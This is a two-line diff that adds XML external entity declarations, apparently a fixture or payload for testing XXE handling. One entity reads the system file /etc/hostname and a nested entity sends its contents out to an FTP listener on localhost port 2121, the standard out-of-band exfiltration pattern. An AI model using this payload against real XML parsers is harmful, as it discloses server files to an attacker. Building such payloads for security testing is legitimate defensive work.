@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///etc/hostname">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://127.0.0.1:2121/%d;'>">
